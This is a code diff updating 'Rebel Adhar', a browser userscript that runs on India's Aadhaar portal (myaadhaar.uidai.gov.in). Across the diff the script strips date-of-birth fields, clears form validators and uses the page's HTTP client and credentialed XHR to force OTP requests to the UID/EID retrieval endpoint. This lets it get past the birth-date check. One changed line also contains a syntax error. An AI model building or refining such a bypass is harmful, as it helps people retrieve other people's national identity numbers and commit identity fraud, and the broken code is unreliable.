@@ -1,8 +1,8 @@
 // ==UserScript==
 // @name         Rebel Adhar
 // @namespace    https://github.com/ujjwalrebel53-wq/SpinPlay99
-// @version      11.1.0
-// @description  Rebel Adhar v11.1 — native OTP pass-through + retrieveuideid API
+// @version      11.2.0
+// @description  Rebel Adhar v11.2 — zero-block native OTP + Angular HttpClient
 // @match        https://myaadhaar.uidai.gov.in/*
 // @match        https://*.uidai.gov.in/*
 // @grant        none
@@ -22,7 +22,7 @@
   const DISABLED_MARK = 'rebel-dob-disabled';
   const HIDDEN_MARK = 'rebel-dob-hidden';
   const DOB_LABEL = /date\s*of\s*birth|\bdob\b|birth\s*date|जन्म|जन्म\s*तिथि/i;
-  const ENGINE_VERSION = '11.1.0';
+  const ENGINE_VERSION = '11.2.0';
 
   let dobWatcher = null;
   let watchTimer = null;
@@ -516,7 +516,7 @@
       removeDobFromDom(uiSel, log);
       neutralizeDobControls(uiSel, log);
     }
-    softHideEmailOnly(log);
+    softHideEmailOnly(log, uiSel);
     enableOtpButtons();
     return {
       dobBypassed: isDobBypassed(uiSel),
@@ -532,7 +532,7 @@
       removeDobFromDom(uiSel, log);
       neutralizeDobControls(uiSel, log);
     }
-    softHideEmailOnly(log);
+    softHideEmailOnly(log, uiSel);
     enableOtpButtons();
     return {
       dobBypassed: isDobBypassed(uiSel),
@@ -546,20 +546,23 @@
     seen.add(cmp);
     const names = new Set([...Object.keys(cmp), ...Object.getOwnPropertyNames(Object.getPrototypeOf(cmp) || {})]);
     names.forEach((name) => {
-      if (!/otp|send|submit|retrieve|generate|request/i.test(name)) return;
+      if (!/otp|send|submit|retrieve|generate|request|validate|uideid|proceed|continue/i.test(name)) return;
       if (typeof cmp[name] !== 'function') return;
       out.push({ cmp, name });
+    });
+    [cmp.service, cmp.apiService, cmp.retrieveService, cmp.http, cmp.form].forEach((svc) => {
+      if (svc && typeof svc === 'object') scanCmpForOtp(svc, out, seen);
     });
   }
 
   function deepInvokeOtp(btn, log) {
     const out = [];
     const seen = new Set();
-    const roots = new Set([btn, ...qAll('app-root, [ng-version], form, mat-form-field, button')]);
+    const roots = new Set([btn, document.querySelector('app-root'), ...qAll('[ng-version], form, mat-form-field, button, app-retrieve-eid-uid, app-root *')]);
     roots.forEach((el) => {
       if (!el) return;
       let cur = el;
-      for (let i = 0; i < 25 && cur; i++, cur = cur.parentElement) {
+      for (let i = 0; i < 30 && cur; i++, cur = cur.parentElement) {
         if (typeof window.ng?.getComponent === 'function') {
           try {
             scanCmpForOtp(window.ng.getComponent(cur), out, seen);
@@ -568,16 +571,127 @@
         walkNg(cur, (item) => scanCmpForOtp(item, out, seen));
       }
     });
+    if (typeof window.ng?.getComponent === 'function') {
+      qAll('*').forEach((el) => {
+        try {
+          scanCmpForOtp(window.ng.getComponent(el), out, seen);
+        } catch (_e) {}
+      });
+    }
     const tried = new Set();
     for (const hit of out) {
-      const key = hit.name;
+      const key = hit.cmp.constructor?.name + '.' + hit.name;
       if (tried.has(key)) continue;
       tried.add(key);
       try {
-        hit.cmp[hit.name]();
-        log?.('info', 'Angular OTP invoke', key);
+        runInAngularZone(() => hit.cmp[hit.name]());
+        log?.('info', 'Angular OTP invoke', hit.name);
         return true;
       } catch (_e) {}
+    }
+    return false;
+  }
+
+  function syncAngularInputs(log) {
+    let n = 0;
+    getMatFields().forEach((f) => {
+      const type = classifyField(f);
+      if (type === 'dob' || type === 'toggle' || type === 'email') return;
+      const input = f.input;
+      if (!input || input.type === 'hidden') return;
+      const val = readInputVal(input);
+      if (!val) return;
+      try {
+        nativeInputSet?.call(input, val);
+      } catch (_e) {}
+      ['input', 'change', 'blur'].forEach((evt) => {
+        input.dispatchEvent(new Event(evt, { bubbles: true, cancelable: true }));
+      });
+      n += 1;
+    });
+    if (n) log?.('info', 'Angular inputs synced', { count: n });
+    return n;
+  }
+
+  function fixAngularValidators(log) {
+    let n = 0;
+    collectFormGroups().forEach((form) => {
+      if (!form.controls) return;
+      Object.entries(form.controls).forEach(([key, ctrl]) => {
+        if (!isDobControlKey(key) && !/email/i.test(key)) return;
+        ctrl.clearValidators?.();
+        ctrl.setErrors?.(null);
+        try {
+          ctrl.disable?.({ emitEvent: false });
+        } catch (_e) {}
+        n += 1;
+      });
+      form.updateValueAndValidity?.({ emitEvent: false });
+    });
+    if (n) log?.('info', 'Angular validators cleared', { count: n });
+    return n;
+  }
+
+  function getHttpClient(log) {
+    const root = document.querySelector('app-root, [ng-version]');
+    if (!root || typeof window.ng?.getInjector !== 'function') return null;
+    try {
+      const injector = window.ng.getInjector(root);
+      const buckets = [injector.records, injector._records, injector._ngOnDestroyHooks];
+      for (const bucket of buckets) {
+        if (!bucket) continue;
+        const entries = bucket instanceof Map ? [...bucket.entries()] : Object.entries(bucket);
+        for (const [, rec] of entries) {
+          const svc = rec?.value ?? (typeof rec?.factory === 'function' ? rec.factory() : null);
+          if (svc?.post && svc?.get) return svc;
+        }
+      }
+      for (const key of Object.keys(injector)) {
+        const val = injector[key];
+        if (val?.post && val?.get) return val;
+      }
+    } catch (err) {
+      log?.('warn', 'HttpClient scan fail', String(err).slice(0, 80));
+    }
+    return null;
+  }
+
+  async function invokeViaPageHttp(uiSel, log) {
+    const http = getHttpClient(log);
+    if (!http?.post) return false;
+    const payloads = buildRetrievePayloads(uiSel);
+    const paths = rankOtpPaths(['/generic/retrieveuideid']).slice(0, 2);
+    for (const path of paths) {
+      for (const body of payloads.slice(0, 3)) {
+        const clean = stripDobFromBody(body).body;
+        try {
+          const result = await new Promise((resolve) => {
+            let done = false;
+            const obs = runInAngularZone(() => http.post(path, clean, { withCredentials: true }));
+            if (!obs || typeof obs.subscribe !== 'function') return resolve(false);
+            obs.subscribe({
+              next: (res) => {
+                if (done) return;
+                done = true;
+                log?.('info', 'HttpClient OTP OK', { path, res: JSON.stringify(res).slice(0, 120) });
+                resolve(true);
+              },
+              error: (err) => {
+                if (done) return;
+                done = true;
+                log?.('info', 'HttpClient OTP try', {
+                  path,
+                  status: err?.status,
+                  msg: String(err?.message || err?.error || err).slice(0, 120),
+                });
+                resolve(false);
+              },
+            });
+            setTimeout(() => resolve(false), 8000);
+          });
+          if (result) return true;
+        } catch (_e) {}
+      }
     }
     return false;
   }
@@ -737,12 +851,7 @@
     return list;
   }
 
-  const PRIORITY_OTP_PATHS = [
-    '/generic/retrieveuideid',
-    '/api/generic/retrieveuideid',
-    '/generic/retrieveuideid/generateOtp',
-    '/generic/retrieveuideid/sendOtp',
-  ];
+  const PRIORITY_OTP_PATHS = ['/generic/retrieveuideid'];
 
   const DEFAULT_OTP_PATHS = [
     '/auth/login/generateOTP',
@@ -758,6 +867,7 @@
   ];
 
   function rankOtpPaths(extraPaths) {
+    const origin = location.origin;
     const all = [...PRIORITY_OTP_PATHS, ...(extraPaths || []), ...DEFAULT_OTP_PATHS];
     const score = (p) => {
       const s = String(p || '');
@@ -765,20 +875,20 @@
       if (/\/generic\/retrieve/i.test(s)) return 1;
       if (/otp|generate/i.test(s) && /retrieve|uideid/i.test(s)) return 2;
       if (/otp|generate/i.test(s)) return 4;
-      if (/\/send-metrics|retrieve-eid-uid$/i.test(s)) return 99;
+      if (/\/send-metrics|retrieve-eid-uid$|\/sendOtp$|\/generateOtp$/i.test(s)) return 99;
       return 8;
     };
-    return [...new Set(all.filter((p) => p && p.length > 3))].sort((a, b) => score(a) - score(b));
+    return [...new Set(all.filter((p) => p && p.length > 3))]
+      .filter((p) => {
+        if (/^https?:\/\//i.test(p)) return p.startsWith(origin);
+        return true;
+      })
+      .sort((a, b) => score(a) - score(b));
   }
 
   function otpUrlBases(path) {
     if (/^https?:\/\//i.test(path)) return [''];
-    return [
-      location.origin,
-      'https://myaadhaar.uidai.gov.in',
-      'https://tathya.uidai.gov.in',
-      'https://api.myaadhaar.uidai.gov.in',
-    ];
+    return [location.origin];
   }
 
   function resolveOtpUrl(base, path) {
@@ -786,39 +896,41 @@
     return base + path;
   }
 
-  async function postOtpTry(url, body, contentType, log) {
-    const stripped = stripDobFromBody(typeof body === 'string' ? body : body);
-    let payload = stripped.body;
-    if (payload != null && typeof payload !== 'string' && !(payload instanceof FormData) && !(payload instanceof URLSearchParams)) {
-      payload = JSON.stringify(payload);
-    }
-    const headers = {
-      Accept: 'application/json, text/plain, */*',
-      'Content-Type': contentType,
-      'X-Requested-With': 'XMLHttpRequest',
-    };
-    try {
-      const res = await fetch(url, {
-        method: 'POST',
-        headers,
-        body: payload,
-        credentials: 'include',
-      });
-      const text = await res.text().catch(() => '');
-      const important = /retrieveuideid|retrieve|otp|generic/i.test(url);
-      if (important || (res.status !== 404 && res.status !== 405)) {
+  function postOtpXhr(url, body, contentType, log) {
+    return new Promise((resolve) => {
+      const stripped = stripDobFromBody(typeof body === 'string' ? body : body);
+      let payload = stripped.body;
+      if (payload != null && typeof payload !== 'string' && !(payload instanceof FormData) && !(payload instanceof URLSearchParams)) {
+        payload = JSON.stringify(payload);
+      }
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', url, true);
+      xhr.withCredentials = true;
+      xhr.setRequestHeader('Accept', 'application/json, text/plain, */*');
+      xhr.setRequestHeader('Content-Type', contentType);
+      xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+      xhr.onload = () => {
+        const text = xhr.responseText || '';
         log?.('info', 'Direct OTP API', {
           url: url.slice(0, 110),
-          status: res.status,
+          status: xhr.status,
           resp: text.slice(0, 120),
         });
+        if (xhr.status >= 200 && xhr.status < 300) return resolve(true);
+        if (/otp.*sent|success|txn|transaction/i.test(text)) return resolve(true);
+        resolve(false);
+      };
+      xhr.onerror = () => {
+        log?.('warn', 'Direct OTP xhr error', { url: url.slice(0, 90) });
+        resolve(false);
+      };
+      try {
+        xhr.send(payload);
+      } catch (err) {
+        log?.('warn', 'Direct OTP xhr send fail', String(err).slice(0, 60));
+        resolve(false);
       }
-      if (res.ok || res.status === 200 || /otp.*sent|success|txn|transaction/i.test(text)) return true;
-      if (res.status >= 200 && res.status < 300 && text && !/error|invalid|fail/i.test(text.slice(0, 80))) return true;
-    } catch (err) {
-      log?.('warn', 'Direct OTP fetch error', { url: url.slice(0, 80), err: String(err).slice(0, 60) });
-    }
-    return false;
+    });
   }
 
   async function directOtpRequest(uiSel, log, extraPaths) {
@@ -832,24 +944,18 @@
       log?.('warn', 'Direct OTP skip — captcha missing');
       return false;
     }
-    const paths = rankOtpPaths(extraPaths);
-    log?.('info', 'Direct OTP try', { paths: paths.slice(0, 6), reqType: getRetrieveReqType() });
+    const paths = rankOtpPaths(extraPaths).slice(0, 3);
+    log?.('info', 'Direct OTP try', { paths, origin: location.origin, reqType: getRetrieveReqType() });
 
+    let tries = 0;
+    const maxTries = 8;
     for (const path of paths) {
-      for (const base of otpUrlBases(path)) {
-        const url = resolveOtpUrl(base, path);
-        for (const body of bodies) {
-          const cleanBody = stripDobFromBody(body).body;
-          if (await postOtpTry(url, cleanBody, 'application/json', log)) return true;
-          const params = new URLSearchParams();
-          const src = typeof cleanBody === 'object' && cleanBody && !Array.isArray(cleanBody) ? cleanBody : body;
-          Object.entries(src || {}).forEach(([k, v]) => {
-            if (v != null && v !== '') params.append(k, String(v));
-          });
-          if (params.toString() && (await postOtpTry(url, params.toString(), 'application/x-www-form-urlencoded', log))) {
-            return true;
-          }
-        }
+      const url = resolveOtpUrl(location.origin, path);
+      for (const body of bodies) {
+        if (tries >= maxTries) return false;
+        tries += 1;
+        const cleanBody = stripDobFromBody(body).body;
+        if (await postOtpXhr(url, cleanBody, 'application/json', log)) return true;
       }
     }
     return false;
@@ -864,7 +970,7 @@
         if (Zone?.run) return Zone.run(fn);
       }
     } catch (_e) {}
-    fn();
+    return fn();
   }
 
   async function invokeOtpPipeline(btn, uiSel, log, netBefore, opts) {
@@ -882,8 +988,11 @@
 
     log?.('info', 'OTP pipeline start', { v: ENGINE_VERSION, skipNative: !!opts.skipNative });
 
+    syncAngularInputs(log);
+    fixAngularValidators(log);
+    enableOtpButtons();
+
     if (!opts.skipNative) {
-      enableOtpButtons();
       runInAngularZone(() => {
         try {
           btn.click();
@@ -895,10 +1004,12 @@
       }
     }
 
-    forceSubmitOtp(btn, log);
-    await waitMs(2000);
-    if (typeof netBefore === 'function' && netBefore()) {
-      return { ok: true, prep, via: 'force-click' };
+    if (await invokeViaPageHttp(uiSel, log)) {
+      await waitMs(1500);
+      if (typeof netBefore === 'function' && netBefore()) {
+        return { ok: true, prep, via: 'http-client' };
+      }
+      return { ok: true, prep, via: 'http-client' };
     }
 
     if (deepInvokeOtp(btn, log)) {
@@ -906,6 +1017,12 @@
       if (typeof netBefore === 'function' && netBefore()) {
         return { ok: true, prep, via: 'angular' };
       }
+    }
+
+    forceSubmitOtp(btn, log);
+    await waitMs(2000);
+    if (typeof netBefore === 'function' && netBefore()) {
+      return { ok: true, prep, via: 'force-click' };
     }
 
     const paths = await scrapeChunkEndpoints(log);
@@ -938,16 +1055,26 @@
     return true;
   }
 
-  /** Sirf CSS hide — disable NAHI (Angular form break hota hai) */
-  function softHideEmailOnly(log) {
+  /** Sirf CSS hide — disable NAHI; mobile mode me hide mat karo (Angular break) */
+  function softHideEmailOnly(log, uiSel) {
+    if (uiSel && shouldSkipEmailToggle(uiSel)) return 0;
     const blocks = findEmailBlocks();
     if (!blocks.length) return 0;
     hideEmail(null, log);
     return blocks.length;
   }
 
-  function neutralizeEmail(log) {
-    return softHideEmailOnly(log);
+  function neutralizeEmail(log, uiSel) {
+    return softHideEmailOnly(log, uiSel);
+  }
+
+  /** OTP click se pehle — email hide nahi, sirf sync + DOB clean */
+  function prepareOtpLight(uiSel, log) {
+    if (dobFieldVisible(uiSel)) removeDobFromDom(uiSel, log);
+    fixAngularValidators(log);
+    syncAngularInputs(log);
+    enableOtpButtons();
+    return buildSubmitState(uiSel, log, { quiet: true });
   }
 
   function mobileFieldFilled(uiSel) {
@@ -962,7 +1089,7 @@
   async function ensureUidaiMobileMode(uiSel, log) {
     if (shouldSkipEmailToggle(uiSel)) {
       log?.('info', 'Mobile mode locked — toggle clicks skip', {});
-      softHideEmailOnly(log);
+      softHideEmailOnly(log, uiSel);
       return true;
     }
     const email = discoverOrLinks(uiSel).find((l) => l.kind === 'email');
@@ -1029,11 +1156,11 @@
 
   function ensureMobileModeSync(uiSel, log) {
     if (shouldSkipEmailToggle(uiSel)) {
-      softHideEmailOnly(log);
+      softHideEmailOnly(log, uiSel);
       return true;
     }
     if (getDobInputs().length) quickModeSwitch(uiSel, log);
-    softHideEmailOnly(log);
+    softHideEmailOnly(log, uiSel);
     return true;
   }
 
@@ -1461,7 +1588,7 @@
 
     if (shouldSkipEmailToggle(uiSel)) {
       log?.('info', 'Mode switch skip — mobile filled + DOB bypassed', {});
-      softHideEmailOnly(log);
+      softHideEmailOnly(log, uiSel);
       return true;
     }
 
@@ -1590,7 +1717,7 @@
     });
   }
 
-  function buildSubmitState(uiSel, log) {
+  function buildSubmitState(uiSel, log, opts) {
     const after = getFormDiagnostics(uiSel);
     const bypassed = isDobBypassed(uiSel);
     const state = {
@@ -1599,7 +1726,7 @@
       after,
       formOk: isFormReadyForOtp(uiSel),
     };
-    log?.('info', 'Send OTP prep', state);
+    if (!opts?.quiet) log?.('info', 'Send OTP prep', state);
     if (!bypassed) {
       log?.('error', 'DOB bypass fail — Bypass DOB dabao (DOB mat bharo)', {
         dobInForm: state.dobInForm,
@@ -1709,6 +1836,10 @@
     buildSubmitState,
     buildOtpPayload,
     buildRetrievePayloads,
+    prepareOtpLight,
+    syncAngularInputs,
+    fixAngularValidators,
+    invokeViaPageHttp,
     prepareSubmit,
     prepareSubmitAsync,
     ensureDobBypassed,
@@ -1947,7 +2078,8 @@
     document.addEventListener('pointerdown', function (e) {
       if (!on || skipOtpHook) return;
       if (!isOtpBtn(e.target)) return;
-      E.prepareSubmit(UI_SEL, log);
+      if (E.prepareOtpLight) E.prepareOtpLight(UI_SEL, log);
+      else E.prepareSubmit(UI_SEL, log);
     }, true);
 
     document.addEventListener('click', function (e) {
@@ -1955,7 +2087,7 @@
       const btn = isOtpBtn(e.target);
       if (!btn) return;
 
-      const prep = E.prepareSubmit(UI_SEL, log);
+      const prep = E.prepareOtpLight ? E.prepareOtpLight(UI_SEL, log) : E.prepareSubmit(UI_SEL, log);
       if (!prep.dobBypassed) {
         e.preventDefault();
         e.stopImmediatePropagation();
@@ -1973,24 +2105,24 @@
 
       const before = netCount;
       otpNetWatch = true;
-      setTimeout(function () { otpNetWatch = false; }, 15000);
+      setTimeout(function () { otpNetWatch = false; }, 15000 });
 
-      log('info', 'OTP send native pass-through', { v: E.ENGINE_VERSION || '11.1' });
+      log('info', 'OTP native — Angular ko click jayega', { v: E.ENGINE_VERSION || '11.2' });
 
       otpRunning = true;
       if (otpFallbackTimer) clearTimeout(otpFallbackTimer);
       otpFallbackTimer = setTimeout(function () {
         otpFallbackTimer = null;
         runOtpFallback(btn, before);
-      }, 4500);
+      }, 5000);
 
       setTimeout(function () {
         if (netCount > before) {
           if (otpFallbackTimer) clearTimeout(otpFallbackTimer);
           otpRunning = false;
-          log('info', 'OTP sent', { via: 'native', v: E.ENGINE_VERSION || '11.1' });
+          log('info', 'OTP sent', { via: 'native', v: E.ENGINE_VERSION || '11.2' });
         }
-      }, 5000);
+      }, 5500);
     }, true);
   }
 
@@ -1998,7 +2130,7 @@
     ensureUI();
     installNet();
     watchOtp();
-    log('info', 'Rebel Adhar v' + (E.ENGINE_VERSION || '11.1') + ' ON — DOB bypass shuru');
+    log('info', 'Rebel Adhar v' + (E.ENGINE_VERSION || '11.2') + ' ON — DOB bypass shuru');
     const ready = await E.waitForForm(30000);
     if (!ready) { log('warn', 'Form timeout — page reload karo'); return; }
     await E.apply(UI_SEL, log);
